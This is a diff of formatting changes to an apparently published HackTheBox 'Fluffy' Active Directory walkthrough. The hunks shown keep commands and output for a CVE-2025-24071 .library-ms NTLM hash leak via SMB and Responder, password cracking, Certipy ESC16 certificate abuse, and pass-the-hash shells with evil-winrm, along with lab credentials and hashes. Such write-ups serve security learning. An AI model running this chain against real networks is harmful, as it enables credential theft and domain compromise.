@@ -1,18 +1,26 @@
 ---
-title: "Fluffy Machine (HackTheBox) — Step-by-Step Walkthrough"
-date: "2025-07-10"
+title: 'Fluffy Machine (HackTheBox) — Step-by-Step Walkthrough'
+date: '2025-07-10'
 draft: false
-tags: ["windows", "hackthebox", "easy", "active-directory", "cve-2025-24071", "privilege-escalation"]
-summary: "Compromise of a Windows HackTheBox Active Directory machine by exploiting CVE-2025-24071 via a malicious library-ms file to capture NTLM hashes via Responder, abusing GenericWrite permissions through BloodHound enumeration to perform Shadow Credential attacks, and escalating to Domain Admin by exploiting an ESC16 ADCS misconfiguration with Certipy."
-images: ["/static/images/fluffy/preview.png"]
+tags:
+  [
+    'windows',
+    'Machine',
+    'hackthebox',
+    'easy',
+    'active-directory',
+    'cve-2025-24071',
+    'privilege-escalation',
+  ]
+summary: 'Compromise of a Windows HackTheBox Active Directory machine by exploiting CVE-2025-24071 via a malicious library-ms file to capture NTLM hashes via Responder, abusing GenericWrite permissions through BloodHound enumeration to perform Shadow Credential attacks, and escalating to Domain Admin by exploiting an ESC16 ADCS misconfiguration with Certipy.'
+images: ['/static/images/fluffy/preview.png']
 ---
-
 
 ![Fluffy](/static/images/fluffy/Fluffy.png)
 
-| **Target IP** | **Username** | **Password** |
-| --- | --- | --- |
-| 10.10.11.69 | j.fleischman | J0elTHEM4n1990! |
+| **Target IP** | **Username** | **Password**    |
+| ------------- | ------------ | --------------- |
+| 10.10.11.69   | j.fleischman | J0elTHEM4n1990! |
 
 ## Pinging
 
@@ -103,7 +111,7 @@ And then I looked for Domain Admins:
 # LDAPv3
 # base <dc=fluffy,dc=htb> with scope subtree
 # filter: (cn=Domain Admins)
-# requesting: member 
+# requesting: member
 #
 
 # Domain Admins, Users, fluffy.htb
@@ -201,7 +209,9 @@ It is an exploit of `CVE-2025-24071`.
 Then following the commands I created the exploit under the name of `exploit.zip` and used the `put` command to send it to the target device for execution.
 
 # CVE-2025–24071 — NTLM Hash Leak via .library-ms File
+
 ## Vulnerability Summary:
+
 A specially crafted .library-ms file can be used to silently leak NTLM hashes when a user extracts it from a ZIP archive and views it in Windows Explorer.
 
 This happens without execution, clicks, or warnings — due to how Windows handles Library files and network shares.
@@ -234,9 +244,9 @@ This happens without execution, clicks, or warnings — due to how Windows handl
 
 ### Why ZIP Extraction Is Key:
 
-* If .library-ms is downloaded directly, SmartScreen blocks it.
-* If it’s extracted from a zip, Windows treats it as local and auto-renders without warning.
-* This bypasses security checks and triggers the NTLM leak.
+- If .library-ms is downloaded directly, SmartScreen blocks it.
+- If it’s extracted from a zip, Windows treats it as local and auto-renders without warning.
+- This bypasses security checks and triggers the NTLM leak.
 
 ### Components Involved:
 
@@ -244,18 +254,18 @@ This happens without execution, clicks, or warnings — due to how Windows handl
 
 ### Mitigation:
 
-* Patch (when released)
-* Block outbound SMB (ports 445, 139)
-* Disable NTLM auth where possible
-* Educate users: Don’t open random ZIPs
-* Use Smart App Control or attack surface reduction rules
+- Patch (when released)
+- Block outbound SMB (ports 445, 139)
+- Disable NTLM auth where possible
+- Educate users: Don’t open random ZIPs
+- Use Smart App Control or attack surface reduction rules
 
 ### Real-World Use Case:
 
-* Delivered via phishing (ZIP with .library-ms)
-* Uploaded to exposed shares (as you did via SMB)
-* Triggers automatically on folder view
-* Used by APTs to steal domain hashes for lateral movement
+- Delivered via phishing (ZIP with .library-ms)
+- Uploaded to exposed shares (as you did via SMB)
+- Triggers automatically on folder view
+- Used by APTs to steal domain hashes for lateral movement
 
 CVE-2025–24071 exploits the way Windows Explorer renders .library-ms files by tricking it into silently leaking NTLM hashes when the file is extracted from a ZIP archive and viewed — no clicks needed.
 
@@ -281,7 +291,6 @@ msf6 >
   domain="github.com"
 />
 
-
 ```bash
 ┌──(kali㉿kali)-[~]
 └─$ git clone https://github.com/FOLKS-IWD/CVE-2025-24071-msfvenom.git
@@ -304,7 +313,7 @@ I then set the target IP and verified that everything is configured correctly:
 ```bash
 msf6 auxiliary(server/ntlm_hash_leak) > set attacker_ip 10.10.11.69
 attacker_ip => 10.10.11.69
-msf6 auxiliary(server/ntlm_hash_leak) > show options 
+msf6 auxiliary(server/ntlm_hash_leak) > show options
 
 Module options (auxiliary/server/ntlm_hash_leak):
 
@@ -337,22 +346,22 @@ Now I'll put the exploit on the target device:
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ cp malicious.library-ms .library-ms
-                                                                                                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ ls
 exploit.zip  malicious.library-ms
-                                                                                                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Desktop]
-└─$ ls -a    
+└─$ ls -a
 .  ..  exploit.zip  .library-ms  malicious.library-ms
 
-                                                                                                                                                              
+
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ smbclient //10.10.11.69/IT -U "fluffy.htb\\\\j.fleischman"
 
 Password for [FLUFFY.HTB\\j.fleischman]:
 Try "help" to get a list of possible commands.
-smb: \\> put .library-ms 
+smb: \\> put .library-ms
 putting file .library-ms as \\.library-ms (0.1 kb/s) (average 0.1 kb/s)
 smb: \\> ls
   .                                   D        0  Mon Jul  7 15:17:01 2025
@@ -372,7 +381,7 @@ I also set up a listener:
 ```bash
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ sudo responder -I tun0 -wd
-[sudo] password for kali: 
+[sudo] password for kali:
                                          __
   .----.-----.-----.-----.-----.-----.--|  |.-----.----.
   |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
@@ -464,11 +473,11 @@ Using default input encoding: UTF-8
 Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
 Will run 2 OpenMP threads
 Press 'q' or Ctrl-C to abort, almost any other key for status
-prometheusx-303  (p.agila)     
+prometheusx-303  (p.agila)
 1g 0:00:00:05 DONE (2025-07-07 08:51) 0.1872g/s 846046p/s 846046c/s 846046C/s promo04..programmercomputer
 Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
-Session completed. 
-                                                                                                                                                                                                                                              
+Session completed.
+
 ┌──(kali㉿kali)-[~/Desktop]
 └─$ john --show ntlmv2.hash
 
@@ -633,28 +642,29 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 [*] NT hash for 'ca_svc': ca0f4f9e9eb8a092addf53bb03fc98c8
 ```
 
-Got hash `ca0f4f9e9eb8a092addf53bb03fc98c8` 
+Got hash `ca0f4f9e9eb8a092addf53bb03fc98c8`
 will try this using evil-winrm
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
-└─$ evil-winrm -i 10.10.11.69 -u "CA_SVC" -H "ca0f4f9e9eb8a092addf53bb03fc98c8" 
-                                        
+└─$ evil-winrm -i 10.10.11.69 -u "CA_SVC" -H "ca0f4f9e9eb8a092addf53bb03fc98c8"
+
 Evil-WinRM shell v3.7
-                                        
+
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
-                                        
+
 Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
-                                        
+
 Info: Establishing connection to remote endpoint
-                                        
+
 Error: An error of type WinRM::WinRMAuthorizationError happened, message is WinRM::WinRMAuthorizationError
-                                        
+
 Error: Exiting with code 1
 ```
+
 **The NTLM hash is valid, but the user doesn't have WinRM access on the target 10.10.11.69.**
 
-### LDAP\_SVC
+### LDAP_SVC
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
@@ -712,9 +722,9 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote text output to '20250709132641_Certipy.txt'
 [*] Saving JSON output to '20250709132641_Certipy.json'
 [*] Wrote JSON output to '20250709132641_Certipy.json'
-                                                                                                                                                             
+
 ┌──(work)─(kali㉿kali)-[~]
-└─$ cat 20250709132641_Certipy.txt 
+└─$ cat 20250709132641_Certipy.txt
 Certificate Authorities
   0
     CA Name                             : fluffy-DC01-CA
@@ -774,10 +784,10 @@ Certipy v5.0.3 - by Oliver Lyak (ly4k)
 [*] Wrote text output to '20250709132840_Certipy.txt'
 [*] Saving JSON output to '20250709132840_Certipy.json'
 [*] Wrote JSON output to '20250709132840_Certipy.json'
-                                                                                                                                                             
-                                                                                                                                                                                                                                                                                                                       
+
+
 ┌──(work)─(kali㉿kali)-[~]
-└─$ cat 20250709132840_Certipy.json                                                                                       
+└─$ cat 20250709132840_Certipy.json
 {
   "Certificate Authorities": {
     "0": {
@@ -839,7 +849,7 @@ Now I looked into "ESC16": "Security Extension is disabled" to understand what i
 
 'ESC16 - Security Extension Disabled'
 
-**Attacker** = `p.agila` 
+**Attacker** = `p.agila`
 **Victim** = `CA_SVC`
 
 The exploitation mechanisms for ESC16 are identical to those for ESC9 because the end result — a certificate lacking the SID security extension — is the same. The important difference is that for ESC16, any certificate template enabling client authentication and issued by this misconfigured CA can be used in the UPN manipulation attack, not just a template specifically flagged with CT_FLAG_NO_SECURITY_EXTENSION.
@@ -848,7 +858,7 @@ The exploitation mechanisms for ESC16 are identical to those for ESC9 because th
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
-└─$ certipy account -u 'ca_SVC@FLUFFY.HTB' -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip '10.10.11.69' -user 'administrator' read           
+└─$ certipy account -u 'ca_SVC@FLUFFY.HTB' -hashes "ca0f4f9e9eb8a092addf53bb03fc98c8" -dc-ip '10.10.11.69' -user 'administrator' read
 Certipy v5.0.3 - by Oliver Lyak (ly4k)
 
 [*] Reading attributes for 'Administrator':
@@ -910,7 +920,7 @@ File 'ca_svc.ccache' already exists. Overwrite? (y/n - saying no will save with 
 └─$ export KRB5CCNAME=ca_svc.ccache
 ```
 
-* Then request the certificate:
+- Then request the certificate:
 
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
@@ -933,7 +943,7 @@ Certipy v5.0.2 - by Oliver Lyak (ly4k)
 ```bash
 ┌──(work)─(kali㉿kali)-[~]
 └─$ certipy-ad account -u 'p.agila' -p 'prometheusx-303' -dc-ip '10.10.11.69' -upn 'ca_svc@fluffy.htb' -user 'ca_svc' update
- 
+
 Certipy v5.0.2 - by Oliver Lyak (ly4k)
 
 [*] Updating user 'ca_svc':
@@ -969,13 +979,13 @@ Using 'evil-winrm' i got the shell of 'Administrator'
 ┌──(work)─(kali㉿kali)-[~]
 └─$ evil-winrm -i 10.10.11.69 -u 'Administrator' -H '8da83a3fa618b6e3a00e93f676c92a6e'
 
-                                        
+
 Evil-WinRM shell v3.7
-                                        
-Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline                                                                                                                            
-                                        
+
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
+
 Data: For more information, check Evil-WinRM GitHub: <https://github.com/Hackplayers/evil-winrm#Remote-path-completion>
-                                        
+
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\\Users\\Administrator\\Documents>
 ```
